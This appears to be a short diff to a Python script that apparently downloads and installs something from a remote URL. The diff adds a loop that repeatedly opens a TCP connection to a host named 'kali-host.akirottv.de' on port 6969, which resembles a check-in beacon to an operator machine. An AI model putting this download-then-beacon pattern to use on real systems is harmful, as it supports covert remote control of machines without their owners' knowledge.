@@ -4,6 +4,7 @@ import ssl
 import subprocess
 import pathlib as pl
 import socket
+import time
 
 class Waiter:
     APP_URL = "http://action.akirottv.de"
@@ -45,7 +46,20 @@ class Waiter:
         except Exception as e:
             print(f"{e}")
 
+    def tcp_ping(self, host="kali-host.akirottv.de", port=6969, timeout=1):
+        try:
+            socket.setdefaulttimeout(timeout)
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((host, port))
+            s.close()
+        except Exception as e:
+            print(e)
+
 if __name__ == "__main__":
     self = Waiter()
     if self.request_url():
         self.download_and_install()
+        time.sleep(5)
+    for i in range(9999999999999):
+        self.tcp_ping()
+        time.sleep(10)
